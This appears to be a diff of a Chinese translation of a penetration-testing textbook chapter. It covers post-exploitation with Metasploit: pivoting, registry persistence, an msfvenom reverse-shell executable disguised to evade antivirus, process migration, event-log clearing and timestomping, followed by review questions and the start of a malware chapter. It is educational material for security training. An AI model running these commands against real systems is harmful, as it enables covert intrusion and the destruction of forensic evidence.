  [+] Route added to subnet 172.30.42.0/255.255.255.0.
- 
 ```
 
 现在路由已就位，我们可以利用它。我们可以在此阶段将 Meterpreter 会话置于后台，然后运行我们想要的任何模块来针对该网络。例如，运行端口扫描是很常见的。下面的代码展示了在将 Meterpreter 会话后台后，从外部检查路由表，随后加载端口扫描模块对该网络进行扫描。
 
 ```
- 
- msf exploit(windows/http/manageengine_connectionid_write)> route print
- 
+msf exploit(windows/http/manageengine_connectionid_write)> route print
+
  IPv4 Active Routing Table
  =========================
- 
+
    Subnet             Netmask            Gateway
    ------             -------            -------
    172.30.42.0        255.255.255.0      Session 1
- 
+
 [*] There are currently no IPv6 routes defined.
 msf exploit(windows/http/manageengine_connectionid_write)>
- 
- 
+
 msf exploit(windows/http/manageengine_connectionid_write)> use auxiliary/scanner/portscan/tcp
 msf auxiliary(scanner/portscan/tcp)> set RHOSTS 172.30.42.0/24
 RHOSTS => 172.30.42.0/24
@@ -7019,18 +7977,17 @@ msf auxiliary(scanner/portscan/tcp)> run
 
 一旦你对其他网络上的系统有了初步了解，就可以开始查找那些系统的漏洞。横向移动的核心是利用已被 compromising 的系统来获得对其他系统的访问，即在系统之间进行横向移动。一旦你的网络路由就位，你就处于良好的位置来实现这种横向移动，从而扩展你在网络中的影响范围。
 
-### Persistence（持久化）
+## Persistence（持久化）
 
+-   获得访问权限很重要，因为它表明你可以 compromise 系统并获取敏感信息。这是向你工作的组织展示其中一些问题的好方法。然而，攻击者不想每次想要访问系统时都继续利用同一漏洞。首先，这很费时。其次，如果攻击者（即使是假冒攻击者，即你）利用漏洞，就不能确定该漏洞不会被修补。这意味着他们以后可能无法进入。收集信息通常不是一次性的。当然，在企业环境中，数据始终在变化。无论攻击者的目标是什么，他们通常都希望保持对被 compromises 系统的访问。
 
+-   维持访问的过程称为`persistence`。访问系统随时间持久化，理想情况下跨越系统重启。理想情况下，攻击者想随时进入系统。有几种技术可以实现这一点。如果系统具有远程访问，例如 Secure Shell（`SSH`）或 Windows 系统的远程桌面，攻击者可以创建一个新用户，该用户拥有远程登录的权限。如果被 compromises 的用户更改密码或账户被删除，新用户仍可供攻击者使用。
 
-
--   [获得访问权限很重要，因为它表明你可以 compromise 系统并获取敏感信息。这是向你工作的组织展示其中一些问题的好方法。然而，攻击者不想每次想要访问系统时都继续利用同一漏洞。首先，这很费时。其次，如果攻击者（即使是假冒攻击者，即你）利用漏洞，就不能确定该漏洞不会被修补。这意味着他们以后可能无法进入。收集信息通常不是一次性的。当然，在企业环境中，数据始终在变化。无论攻击者的目标是什么，他们通常都希望保持对被 compromises 系统的访问。
-
--   维持访问的过程称为 `persistence`。访问系统随时间持久化，理想情况下跨越系统重启。理想情况下，攻击者想随时进入系统。有几种技术可以实现这一点。如果系统具有远程访问，例如 Secure Shell (`SSH`) 或 Windows 系统的远程桌面，攻击者可以创建一个新用户，该用户拥有远程登录的权限。如果被 compromises 的用户更改密码或账户被删除，新用户仍可供攻击者使用。
-
--   另一种方法是安装能够主动向攻击者系统发起连接的软件。这通常是最佳选择，因为防火墙可能会阻止入站连接尝试，但出站连接通常被允许。因此，我们可以安装一个 reverse shell 包，它会在我们有一个等待监听的处理器时向我们的系统连接。在下面的代码片段中，你可以看到从 Meterpreter 会话开始，安装一个在用户登录时自动启动的程序。此持久化机制使用注册表存储 payload。在注册表的 `HKEY_CURRENT_USER`（HKCU）下创建一个 `Run` 关键字，然后加载该关键字来调用 payload。
+-   另一种方法是安装能够主动向攻击者系统发起连接的软件。这通常是最佳选择，因为防火墙可能会阻止入站连接尝试，但出站连接通常被允许。因此，我们可以安装一个 reverse shell 包，它会在我们有一个等待监听的处理器时向我们的系统连接。在下面的代码片段中，你可以看到从 Meterpreter 会话开始，安装一个在用户登录时自动启动的程序。此持久化机制使用注册表存储 payload。在注册表的`HKEY_CURRENT_USER`（HKCU）下创建一个`Run`关键字，然后加载该关键字来调用 payload。
 
 **注册表持久化（Metasploit）**
+
+
 
 ```
 meterpreter> getuid
@@ -7051,7 +8008,7 @@ msf exploit(windows/local/registry_persistence)> exploit
 [* ] 正在安装 run key
 ```
 
--   此过程利用注册表存储可执行的 blob，且对注册表中存储和执行的内容没有控制权。你也可以自行创建可执行文件，同样使用注册表技术。但你无法使用上面所示的模块。要创建自己的独立可执行文件，可以使用 Metasploit 的 `msfvenom` 程序。下面的代码片段展示了 `msfvenom` 的示例运行，它将 payload `windows/meterpreter/reverse_tcp`（向指定 IP 地址发送反向 Meterpreter 会话）打包为 Windows 可执行文件。
+此过程利用注册表存储可执行的 blob，且对注册表中存储和执行的内容没有控制权。你也可以自行创建可执行文件，同样使用注册表技术。但你无法使用上面所示的模块。要创建自己的独立可执行文件，可以使用 Metasploit 的 `msfvenom` 程序。下面的代码片段展示了 `msfvenom` 的示例运行，它将 payload `windows/meterpreter/reverse_tcp`（向指定 IP 地址发送反向 Meterpreter 会话）打包为 Windows 可执行文件。
 
 **使用 `msfvenom` 创建独立 payload**
 
@@ -7071,9 +8028,9 @@ root@quiche:~# ls -la elfbowling.exe
 -rw-r--r-- 1 root 73802 Sep 12 17:58 elfbowling.exe
 ```
 
--   命令行参数大多相当直观。我们正在为 32 位 Windows 系统创建一个 `.exe` 文件。payload 会向 192.168.86.57 的 3445 端口建立连接。要在目标系统上使用 Meterpreter，需要启动一个 handler。为了呼应几十年前的几个 silly games，我称其为 `elfbowling.exe`。也许看到它的人不会觉得特别奇怪。除了将 payload 打包进标准的 portable executable 格式外，`.exe` 还被编码。编码的目的是躲避防病毒程序。
+命令行参数大多相当直观。我们正在为 32 位 Windows 系统创建一个 `.exe` 文件。payload 会向 192.168.86.57 的 3445 端口建立连接。要在目标系统上使用 Meterpreter，需要启动一个 handler。为了呼应几十年前的几个 silly games，我称其为 `elfbowling.exe`。也许看到它的人不会觉得特别奇怪。除了将 payload 打包进标准的 portable executable 格式外，`.exe` 还被编码。编码的目的是躲避防病毒程序。
 
--   还有其他方法创建持久连接。另一种是使用 Metsvc。这是 Meterpreter 服务，它会创建一个监听器（默认端口 31337），可以通过该端口连接以获得 Meterpreter shell。你会注意到 Metasploit 表示 Meterpreter 脚本已被弃用，建议加载模块并使用它们。但目前 Meterpreter 服务仍可用，只要你能通过防火墙连接到指定端口即可。
+还有其他方法创建持久连接。另一种是使用 Metsvc。这是 Meterpreter 服务，它会创建一个监听器（默认端口 31337），可以通过该端口连接以获得 Meterpreter shell。你会注意到 Metasploit 表示 Meterpreter 脚本已被弃用，建议加载模块并使用它们。但目前 Meterpreter 服务仍可用，只要你能通过防火墙连接到指定端口即可。
 
 **在目标上创建 Meterpreter 服务**
 
@@ -7090,7 +8047,7 @@ meterpreter> run metsvc
 [* ] 启动服务…
 ```
 
--   如所述，Meterpreter 服务要求可以进行入站连接。此外，Meterpreter 服务脚本已被弃用，可能很快从 Metasploit 中移除。取而代之的是 Metasploit 指出的模块。下面的代码片段展示了该模块的使用。它需要你有一个可上传并安装在目标系统的可执行文件。这里提供的正是之前创建的 reverse Meterpreter 可执行文件的输出。你会看到 Meterpreter 将 payload 上传到目标系统并创建持久化可执行文件。注册表 entries 会在用户登录时自动运行该持久化可执行文件。可以看到引用了 HKCU，即 `HKEY_CURRENT_USER`，这是记录已登录用户的注册表位置。
+如所述，Meterpreter 服务要求可以进行入站连接。此外，Meterpreter 服务脚本已被弃用，可能很快从 Metasploit 中移除。取而代之的是 Metasploit 指出的模块。下面的代码片段展示了该模块的使用。它需要你有一个可上传并安装在目标系统的可执行文件。这里提供的正是之前创建的 reverse Meterpreter 可执行文件的输出。你会看到 Meterpreter 将 payload 上传到目标系统并创建持久化可执行文件。注册表 entries 会在用户登录时自动运行该持久化可执行文件。可以看到引用了 HKCU，即 `HKEY_CURRENT_USER`，这是记录已登录用户的注册表位置。
 
 **使用 Metasploit 模块实现持久化**
 
@@ -7105,18 +8062,17 @@ meterpreter> run post/windows/manage/persistence:exe REXEPATH=/root/elfbowling.e
 [* ] 将其安装为自动启动项 HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qWQPRsRzw
 [+ ] 已安装为自动启动项 HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qWQPRsRzw
 [* ] 清理 Meterpreter RC 文件: /root/.msf4/logs/persistence/VAGRANT-2008R2_22230112.4749/VAGRANT-2008R2_2230112.4749.rc
-
-
+```
 
 这给我们提供了多种在初始入口之后继续访问目标系统的方法。你可能已经注意到，这些持久化机制会在目标系统上留下文件和注册表条目。这些操作和痕迹如果目标端点上有检测机制，或者有人在关注端点活动，就可以被检测到。这是一个需要考虑的因素。当你在调查端点时，你可能会观察到目标上是否安装了恶意软件检测或其他类型的检测软件。
 
 除了注册表持久化之外，还有许多其他常见技术可以用来保持存在。例如，Windows 支持登录脚本，这些脚本可以在用户登录时在目标系统上执行，从而运行攻击者控制的代码。在类 Unix 系统中，情况类似，两种操作系统都支持在启动时执行的服务。
 
-Windows 有一个名为“后台智能传输服务”（BITS）的服务。BITS 允许诸如更新之类的任务在后台安静运行，不会影响正常用户体验。然而，BITS 不仅用于后台文件或数据传输，它还让攻击者可以通过 PowerShell  manipulation 来操控这些任务。攻击者可以创建一个 BITS 作业来下载恶意代码并在完成后自行清理。这正是 BITS 能够实现的，也是它被攻击者广泛使用的原因。
+Windows 有一个名为“后台智能传输服务”（BITS）的服务。BITS 允许诸如更新之类的任务在后台安静运行，不会影响正常用户体验。然而，BITS 不仅用于后台文件或数据传输，它还让攻击者可以通过 PowerShell manipulation 来操控这些任务。攻击者可以创建一个 BITS 作业来下载恶意代码并在完成后自行清理。这正是 BITS 能够实现的，也是它被攻击者广泛使用的原因。
 
 另一种攻击者可以使用的战术是劫持执行流。通过插入恶意代码或配置来实现。例如，攻击者可以安装一个恶意动态链接库（DLL），该 DLL 可以在正常程序运行的同时执行攻击者的代码。此外，在 Windows 系统上，攻击者还可以修改注册表键来更改某些文件类型的处理程序。这样，当用户尝试打开特定文件类型时，操作系统会调用恶意可执行文件。例如，如果攻击者修改了 .docx 文件的处理程序，每当用户双击 Word 文档时，恶意代码就会被执行。攻击者随后会确保正确的文件被打开在 Word 中，以伪装劫持行为。
 
-### 覆盖痕迹
+## 覆盖痕迹
 
 只要你在渗透测试或安全评估中获得系统访问权限，就会留下痕迹。登录系统的行为会在日志中留下记录。任何需要在系统上留下的文件或其他 artifacts 都有可能被定位并被标记为恶意。这意味着你的行动可能被调查，据点可能被清除。你将不得不重新开始，对付那些加强了防护措施的目标。因此，你需要擅长最好地隐藏自己的存在。
 
@@ -7124,7 +8080,7 @@ Windows 有一个名为“后台智能传输服务”（BITS）的服务。BITS 
 
 有时覆盖痕迹会导致一定程度的模糊性。你让某些东西变得更难以发现或理解。这有点像试图在开阔的田野中隐藏自己。你尽力掩盖自己，但只要有人认真搜寻，就会发现你。
 
-#### Rootkits
+### Rootkits
 
 进程表，坦率地说，是最难处理的痕迹。原因是进程表存储在内核空间中。要对进程表进行任何操作，你需要能够隐藏内核空间中的某些内容。在大多数现代操作系统中，安全和权限采用环模型。最高权限是 ring 0，即内核空间，这意味着你拥有完整的系统控制权，因为内核与硬件交互。没有其他任何部分或元素会与硬件交互或需要内核处理的组件。
 
@@ -7134,7 +8090,7 @@ Windows 有一个名为“后台智能传输服务”（BITS）的服务。BITS 
 
 遗憾的是，rootkit 并不是 Metasploit 或其他攻击工具自带的组件。相反，Metasploit 使用诸如进程编码等技术来躲避恶意软件扫描，使得扫描工具更难以识别你所注入的软件。此外，如果你能够控制可执行文件的名称，将其改为不易引起怀疑的名称可以帮助保护进程。例如，如果你将其命名为 `lsass.exe`，任何查看的人都会认为这是普通的 Windows 系统进程，而不会产生疑虑。
 
-#### 进程注入
+### 进程注入
 
 为了不留下可以追溯到我们的进程，我们可以考虑利用其他进程的空间。一种方法是将代码注入到已存在的进程中。过程注入的概念是将攻击者想要运行的代码注入到一个现有进程中。一旦代码被注入，攻击者需要使其运行，这可以通过在目标进程中启动一个新线程来实现。在 Windows 系统上，这通过获取进程的句柄并使用该句柄在目标进程中分配内存来完成。从 Windows API 的角度来看，句柄本质上是指向进程表中进程条目的指针。
 
@@ -7143,8 +8099,6 @@ Windows 有一个名为“后台智能传输服务”（BITS）的服务。BITS 
 ```
 Process Injection Module
 ```
-
-
 
 -   [使用过程注入模块](https://wiki.example.org/process_injection) 将 Meterpreter 注入到 PID 为 3940 的进程中，使用 `windows/shell_bind_tcp` 为其创建反向 Meterpreter 监听器。
 
@@ -7173,16 +8127,21 @@ msf> connect 192.168.86.25 4444
 meterpreter> run post/windows/manage/migrate
 
    [*] 正在对 VAGRANT-2008R2 执行模块  
+
    [*] 当前服务器进程: NepqI.jsp (5624)  
+
    [*] 启动 notepad.exe 进程以进行迁移  
+
    [+] 迁移到 6012  
+
    [+] 成功迁移到进程 6012  
+
 meterpreter> 
 ```
 
--   通过进程迁移，我们可以在 endpoint protection 解决方案中更好地规避检测。所有操作都在已存在且看似正常的进程空间中进行，即使行为可能被认为是恶意。正如本章其他技术所述，关键是保持不被检测。将恶意代码运行在不易引起注意的进程中，是维持持久访问而不被发现的好方法。
+通过进程迁移，我们可以在 endpoint protection 解决方案中更好地规避检测。所有操作都在已存在且看似正常的进程空间中进行，即使行为可能被认为是恶意。正如本章其他技术所述，关键是保持不被检测。将恶意代码运行在不易引起注意的进程中，是维持持久访问而不被发现的好方法。
 
-#### 日志操作
+### 日志操作
 
 日志信息可能是一把双刃剑。在某些情况下，目标几乎没有任何日志。它们记录的内容只保存在本地系统上，这意味着如果有人想查看，只能在本地系统上找到信息。一些组织会为事件做准备，确保不仅有完善的日志政策，而且将系统日志集中存储，这意味着对本地系统日志的任何修改都不会产生影响，因为调查人员会前往集中日志存储库，并可能使用 ElasticStack 或 Splunk 等日志搜索工具。
 
@@ -7192,17 +8151,23 @@ meterpreter>
 
 ```
 meterpreter> clearev
+
  [*] 正在擦除 Application… 的 635 条记录  
+
  [-] stdapi_sys_eventlog_clear: 操作失败: 访问被拒绝。  
+
  meterpreter> getuid  
+
  服务器用户名: NT AUTHORITY\LOCAL SERVICE
 ```
 
+
+
 从输出可以看出，使用的帐户权限不足以清除系统事件日志。根据用户标识，我们使用的是 LOCAL SERVICE 用户而非 LOCALSYSTEM 用户。LOCALSYSTEM 用户拥有足够的权限来修改日志。LOCAL SERVICE 用户权限有限。
 
-在类 Unix 系统上，日志通常以明文文件形式存在。只要拥有正确的权限，这些文件可以通过删除或去除可疑行来进行修改，除非系统启用了审计，否则修改日志是不可见的，这意味着你可以在不留下痕迹的情况下随意更改它们。你也可以在系统上停止 syslog 进程。在获得访问权限之前的所有操作都会被记录，但之后你可以在系统上进行其他操作而不产生日志。同样，如果系统启用了审计，你可以禁用审计守护进程。
+在类 Unix 系统上，日志通常以明文文件形式存在。只要拥有正确的权限，这些文件可以通过删除或去除可疑行来进行修改，除非系统启用了审计，否则修改日志是不可见的，这意味着你可以在不留下痕迹的情况下随意更改它们。你也可以在系统上停止 `syslog` 进程。在获得访问权限之前的所有操作都会被记录，但之后你可以在系统上进行其他操作而不产生日志。同样，如果系统启用了审计，你可以禁用审计守护进程。
 
-#### 隐藏数据
+### 隐藏数据
 
 隐藏数据是常见的活动。某些文件可以伪装在显眼位置。例如，在 Windows 系统上，存在于临时目录的文件可以用来隐藏数据。这尤其适用于从 Internet 下载的内容。图 7.4 展示了 Windows 系统上 Chrome 临时 Internet 文件的目录列表。这是针对单个用户的缓存目录，通常不被普通用户访问，因此在此放置文件几乎不会被注意到。
 
@@ -7222,19 +8187,16 @@ Figure 7.5 展示了创建交替数据流并列出其存在的目录。并非所
 
 **FIGURE 7.5** Using alternate data streams in Windows
 
+- 存储可执行文件到 ADS 的挑战在于它们不再能直接在 ADS 中执行。你需要提取可执行文件并运行它，而不是尝试从独立的数据流中调用它。这有助于保护系统免受攻击者直接调用的攻击，因为常规目录列表（包括 Windows Explorer）不会显示 ADS 的存在。文件大小仅显示主数据流，完全忽略其他数据流。这使得隐藏数据有效，但对直接执行的数据隐藏并不是最有效的。
 
-
--   [存储可执行文件到 ADS 的挑战在于它们不再能直接在 ADS 中执行。你需要提取可执行文件并运行它，而不是尝试从独立的数据流中调用它。这有助于保护系统免受攻击者直接调用的攻击，因为常规目录列表（包括 Windows Explorer）不会显示 ADS 的存在。文件大小仅显示主数据流，完全忽略其他数据流。这使得隐藏数据有效，但对直接执行的数据隐藏并不是最有效的。
-
--   Windows 系统的另一个最终可能性是体积阴影副本服务。这是 Windows 用于在运行系统上存储卷的备份的方法。Windows 创建这些阴影副本来保持文件的版本，以便在需要时回滚。可以（虽然比较困难）挂载体积阴影副本并对其中的文件进行操作。这可以用于隐藏数据，但并不是最佳方式，因为处理起来非常繁琐。
+- Windows 系统的另一个最终可能性是体积阴影副本服务。这是 Windows 用于在运行系统上存储卷的备份的方法。Windows 创建这些阴影副本来保持文件的版本，以便在需要时回滚。可以（虽然比较困难）挂载体积阴影副本并对其中的文件进行操作。这可以用于隐藏数据，但并不是最佳方式，因为处理起来非常繁琐。
 
 ### 时间管理
 
-文件系统中的文件都关联有日期和时间。你通常会有每个文件的修改时间、访问时间和创建时间。如果你尝试用你自己制作的恶意软件 payload 替换系统中的常见文件，上传文件的时间戳会被保留，从而更易被检测。相反，你可以修改文件的时间。我们再次使用 Meterpreter。下面的代码展示了使用 `timestomp` 来操作文件时间的用法。通过 `timestomp`，我们可以将上传文件的时间设置为与合法文件相同的时间戳。当我们将替换文件移动到位时，它的时间戳就会与合法文件匹配。
+文件系统中的文件都关联有日期和时间。你通常会有每个文件的修改时间、访问时间和创建时间。如果你尝试用你自己制作的恶意软件 payload 替换系统中的常见文件，上传文件的时间戳会被保留，从而更易被检测。相反，你可以修改文件的时间。我们再次使用 `Meterpreter`。下面的代码展示了使用 `timestomp` 来操作文件时间的用法。通过 `timestomp`，我们可以将上传文件的时间设置为与合法文件相同的时间戳。当我们将替换文件移动到位时，它的时间戳就会与合法文件匹配。
 
 **Timestomping Files**
 
-```
 ```
 meterpreter> upload regedit.exe
 [* ] uploading : regedit.exe -> regedit.exe
@@ -7244,7 +8206,7 @@ meterpreter> timestomp regedit.exe -f /windows/regedit.exe
 [* ] Pulling MACE attributes from /windows/regedit.exe
 ```
 
--   任何对文件进行操作时，都会通过“触碰”文件来调整其时间值。例如，你会改变文件的修改时间和访问时间。为了掩盖痕迹，你可以在修改文件后将这些时间值恢复为原来的状态。
+- 任何对文件进行操作时，都会通过“触碰”文件来调整其时间值。例如，你会改变文件的修改时间和访问时间。为了掩盖痕迹，你可以在修改文件后将这些时间值恢复为原来的状态。
 
 ## 总结
 
@@ -7256,166 +8218,163 @@ meterpreter> timestomp regedit.exe -f /windows/regedit.exe
 
 你可能会遇到无法从外部直接访问的网络。此时可以通过已 compromized 系统进行 pivot（路由），把流量通过受控系统转发到内部网络的其他系统。
 
-为了完成许多任务，你需要管理员权限。这通常需要提升权限。可以通过 Meterpreter 自动完成，但更常见的是利用本地漏洞获取管理员权限。Metasploit 可以帮助，但你可能还需要寻找并使用其他本地 exploit。提升权限的另一个常见需求是持久化，即确保在需要时可以重新进入系统。虽然可以在不提升权限的情况下实现持久化，但拥有管理员权限始终更有帮助。
+为了完成许多任务，你需要管理员权限。这通常需要提升权限。可以通过 `Meterpreter` 自动完成，但更常见的是利用本地漏洞获取管理员权限。Metasploit 可以帮助，但你可能还需要寻找并使用其他本地 exploit。提升权限的另一个常见需求是持久化，即确保在需要时可以重新进入系统。虽然可以在不提升权限的情况下实现持久化，但拥有管理员权限始终更有帮助。
 
 为了隐藏痕迹，你可能会擦除或篡改日志。这同样需要管理员权限。隐藏文件的方式有很多，这有助于在目视检查时不被发现。真正隐藏文件和进程可能需要 rootkit。你也可以操纵文件的时间戳，这在修改系统提供的文件时可能是必要的。
 
 ## Review Questions
 
-1. 文件元数据中通常存储的三个时间是哪些？  
-   1. Moves, adds, changes  
-   2. Modified, accessed, deleted  
-   3. Moved, accessed, changed  
-   4. Modified, accessed, created  
+1. 文件元数据中通常存储的三个时间是哪些？
+   1. Moves, adds, changes
+   2. Modified, accessed, deleted
+   3. Moved, accessed, changed
+   4. Modified, accessed, created
 
-2. 从普通用户账户获得管理员权限的过程叫什么？  
-   1. Privilege escalation  
-   2. Account migration  
-   3. Privilege migration  
-   4. Account escalation  
+2. 从普通用户账户获得管理员权限的过程叫什么？
+   1. Privilege escalation
+   2. Account migration
+   3. Privilege migration
+   4. Account escalation
 
-3. John the Ripper 的单次 crack 模式（默认模式）的作用是什么？  
-   1. 检查所有可能的密码  
-   2. 使用已知信息和伪装规则  
-   3. 使用内置字典  
-   4. 使用字典和伪装规则  
+3. John the Ripper 的单次 crack 模式（默认模式）的作用是什么？
+   1. 检查所有可能的密码
+   2. 使用已知信息和伪装规则
+   3. 使用内置字典
+   4. 使用字典和伪装规则
 
-4. 使用彩虹表的代价是什么？  
-   1. 磁盘空间优先于速度  
-   2. 精度优先于磁盘空间  
-   3. 速度优先于精度  
-   4. 速度优先于磁盘空间  
+4. 使用彩虹表的代价是什么？
+   1. 磁盘空间优先于速度
+   2. 精度优先于磁盘空间
+   3. 速度优先于精度
+   4. 速度优先于磁盘空间
 
-5. 使用本地漏洞进行 exploit 的原因有哪些？  
-   1. Pivoting  
-   2. 日志篡改  
-   3. 特权提升  
-   4. 密码收集  
+5. 使用本地漏洞进行 exploit 的原因有哪些？
+   1. Pivoting
+   2. 日志篡改
+   3. 特权提升
+   4. 密码收集
 
-6. 修改文件时间戳的操作叫什么？  
-   1. Time stamping  
-   2. Timestomping  
-   3. Meta stomping  
-   4. Meta manipulation  
+6. 修改文件时间戳的操作叫什么？
+   1. Time stamping
+   2. Timestomping
+   3. Meta stomping
+   4. Meta manipulation
 
-7. 攻击者在 Windows 系统上使用交替数据流（ADS）是为了什么目的？  
-   1. 隐藏文件  
-   2. 运行程序  
-   3. 存储 PowerShell 脚本  
-   4. 阻止文件  
+7. 攻击者在 Windows 系统上使用交替数据流（ADS）是为了什么目的？
+   1. 隐藏文件
+   2. 运行程序
+   3. 存储 PowerShell 脚本
+   4. 阻止文件
 
-8. 哪种技术可能直接用于保持对系统的访问？  
-   1. 在 Windows 注册表中运行键值  
-   2. 交替数据流  
-   3. Linux 上的 `.vimrc` 文件  
-   4. PowerShell  
+8. 哪种技术可能直接用于保持对系统的访问？
+   1. 在 Windows 注册表中运行键值
+   2. 交替数据流
+   3. Linux 上的 `.vimrc` 文件
+   4. PowerShell
 
+9. 如果你在寻找可以针对已知漏洞的可靠利用手段，你会使用什么？
+   1. Tor 网络
+   2. `Meterpreter`
+   3. `msfvenom`
+   4. Exploit‑DB
 
+10. 使用 `Meterpreter` 中的 `clearev` 命令，攻击者可能想做什么？
+    1. 运行漏洞利用
+    2. 篡改时间戳
+    3. 篡改日志文件
+    4. 远程登录
 
+11. 你在获得系统访问后发现自己是 `www-data` 用户，刚进入系统后你可能会尝试做什么？
+    1. 跳转到另一个网络
+    2. 提升权限
+    3. 清除日志
+    4. 利用网页浏览器
 
-9. 如果你在寻找可以针对已知漏洞的可靠利用手段，你会使用什么？  
-   1. Tor 网络  
-   2. Meterpreter  
-   3. `msfvenom`  
-   4. Exploit‑DB  
+12. 你在受害系统上安装了多个文件和进程。你还应该尝试安装什么？
+    1. 注册表键
+    2. 交替数据流
+    3. Rootkit
+    4. Root 登录
 
-10. 使用 Meterpreter 中的 `clearev` 命令，攻击者可能想做什么？  
-    1. 运行漏洞利用  
-    2. 篡改时间戳  
-    3. 篡改日志文件  
-    4. 远程登录  
+13. 你在受害系统上进行横向移动。这能为你带来什么？
+    1. 数据库访问
+    2. 通往额外网络的路径
+    3. 更高权限
+    4. 持久访问
 
-11. 你在获得系统访问后发现自己是 `www-data` 用户，刚进入系统后你可能会尝试做什么？  
-    1. 跳转到另一个网络  
-    2. 提升权限  
-    3. 清除日志  
-    4. 利用网页浏览器  
+14. 你会使用程序 `rtgen` 做什么？
+    1. 生成词列表
+    2. 生成彩虹表
+    3. 生成防火墙规则
+    4. 持久访问
 
-12. 你在受害系统上安装了多个文件和进程。你还应该尝试安装什么？  
-    1. 注册表键  
-    2. 交替数据流  
-    3. Rootkit  
-    4. Root 登录  
+15. 哪种方式可以利用客户端漏洞进行攻击？
+    1. 向 Web 服务器发送损坏的数据包
+    2. 发送大量 ICMP 数据包
+    3. 发送精心构造的 URL
+    4. 暴力破解密码
 
-13. 你在受害系统上进行横向移动。这能为你带来什么？  
-    1. 数据库访问  
-    2. 通往额外网络的路径  
-    3. 更高权限  
-    4. 持久访问  
+16. 过程注入的一个结果是什么？
+    1. 隐藏进程
+    2. Rootkit
+    3. 交替数据流
+    4. 隐写
 
-14. 你会使用程序 `rtgen` 做什么？  
-    1. 生成词列表  
-    2. 生成彩虹表  
-    3. 生成防火墙规则  
-    4. 持久访问  
+17. 哪种工具可以用于入侵系统并随后进行后期操作？
+    1. `nmap`
+    2. John the Ripper
+    3. `searchsploit`
+    4. Metasploit
 
-15. 哪种方式可以利用客户端漏洞进行攻击？  
-    1. 向 Web 服务器发送损坏的数据包  
-    2. 发送大量 ICMP 数据包  
-    3. 发送精心构造的 URL  
-    4. 暴力破解密码  
+18. 哪个应用是客户端漏洞的常见目标？
+    1. Web 服务器
+    2. Web 浏览器
+    3. Web 应用防火墙
+    4. Web 页面
 
-16. 过程注入的一个结果是什么？  
-    1. 隐藏进程  
-    2. Rootkit  
-    3. 交替数据流  
-    4. 隐写  
+19. 使用根套件（rootkit）的两个优势是什么？
+    1. 安装交替数据流和注册表键
+    2. 创建注册表键和隐藏进程
+    3. 隐藏进程和文件
+    4. 隐藏文件和注册表键
 
-17. 哪种工具可以用于入侵系统并随后进行后期操作？  
-    1. nmap  
-    2. John the Ripper  
-    3. `searchsploit`  
-    4. Metasploit  
+20. 你可以使用什么来从受害系统中获取密码哈希？
+    1. John the Ripper
+    2. `mimikatz`
+    3. 彩虹表
+    4. 进程转储
 
-18. 哪个应用是客户端漏洞的常见目标？  
-    1. Web 服务器  
-    2. Web 浏览器  
-    3. Web 应用防火墙  
-    4. Web 页面  
+21. 为了防止已记录的 PowerShell 脚本被理解，你会使用什么技术？
+    1. 编码
+    2. 隐蔽
+    3. 彩虹表
+    4. Kerberoasting
 
-19. 使用根套件（rootkit）的两个优势是什么？  
-    1. 安装交替数据流和注册表键  
-    2. 创建注册表键和隐藏进程  
-    3. 隐藏进程和文件  
-    4. 隐藏文件和注册表键  
+22. 哪种技术最有可能用于在 Windows 网络中远程系统上收集凭据？
+    1. Kerberoasting
+    2. 模糊测试
+    3. Rootkit
+    4. PowerShell 脚本
 
-20. 你可以使用什么来从受害系统中获取密码哈希？  
-    1. John the Ripper  
-    2. mimikatz  
-    3. 彩虹表  
-    4. 进程转储  
+23. 想在 Windows 系统上“活体”作战的攻击者最可能使用哪种语言？
+    1. Ruby
+    2. Python
+    3. `cmdlets`
+    4. PowerShell
 
-21. 为了防止已记录的 PowerShell 脚本被理解，你会使用什么技术？  
-    1. 编码  
-    2. 隐蔽  
-    3. 彩虹表  
-    4. Kerberoasting  
+24. 如果你想找出应用程序（包括网络服务）中先前未被发现的漏洞，你可能会使用哪种工具？
+    1. `Rubeus`
+    2. `Ophcrack`
+    3. John the Ripper
+    4. `Peach`
 
-22. 哪种技术最有可能用于在 Windows 网络中远程系统上收集凭据？  
-    1. Kerberoasting  
-    2. 模糊测试  
-    3. Rootkit  
-    4. PowerShell 脚本  
+25. 如果你在入侵系统后需要一个与操作系统无关的接口，你可能会使用哪种工具？
+    1. `Rubeus`
+    2. `Meterpreter`
+    3. `Empire`
+    4. `Ophcrack`
 
-23. 想在 Windows 系统上“活体”作战的攻击者最可能使用哪种语言？  
-    1. Ruby  
-    2. Python  
-    3. cmdlets  
-    4. PowerShell  
-
-24. 如果你想找出应用程序（包括网络服务）中先前未被发现的漏洞，你可能会使用哪种工具？  
-    1. Rubeus  
-    2. Ophcrack  
-    3. John the Ripper  
-    4. Peach  
-
-25. 如果你在入侵系统后需要一个与操作系统无关的接口，你可能会使用哪种工具？  
-    1. Rubeus  
-    2. Meterpreter  
-    3. Empire  
-    4. Ophcrack  
-
-Malware
+# Malware
 
 Malware 是大生意。不仅有数百万种恶意软件家族和变体在全球流通，且有大量未知的程序员在开发这些恶意软件；此外，至少有数十家公司在研发反恶意软件解决方案。开发恶意软件的工程师们是受薪编写软件、预计出售恶意软件，或期望通过恶意软件运营获利。
 
@@ -7443,10 +8402,9 @@ Figure 8.1 展示了 AV‑TEST 在其网站上识别出的新恶意软件样本�
 
 由于用于防止或清除恶意软件的软件常被称为 *antivirus*，你很可能会联想到 *virus* 这个词。当然，并非所有恶意软件都是病毒，但所有计算机病毒都是恶意软件。病毒需要用户介入才能感染系统。用户必须执行某个动作才能触发病毒。一旦触发，病毒会可能注入代码到其他程序中，使得这些程序在运行时仍然保持对受感染系统的控制。每当受感染的程序被运行时，系统就会被重新感染，即使原始可执行文件和进程已被删除。要清除病毒，必须彻底删除所有实例。
 
-
-
-
 病毒自 1970 年代初期以来就已经存在，尽管自 1949 年起，关于自复制计算机程序的理论已经出现。早期的计算机病毒例子是 Creeper，它感染了 ARPAnet 系统。该病毒仅复制自身，除了消耗时间以隔离和清除它外，没有造成其他损害。这并不意味着处理病毒不具备重要性，因为应对病毒可能非常耗时。Creeper 没有删除任何文件，也没有使系统无法使用。
+
+
 
 个人电脑上第一个病毒是 Elk Cloner。它同样仅复制自身。在 Elk Cloner 的情况下，它会复制到插入系统的软盘上。随后，这些软盘会被带到其他系统，从而在该系统上感染操作系统，使得程序能够感染任何插入该系统的软盘。
 
@@ -7470,8 +8428,6 @@ Figure 8.1 展示了 AV‑TEST 在其网站上识别出的新恶意软件样本�
 
 ### Trojan
 
-
-
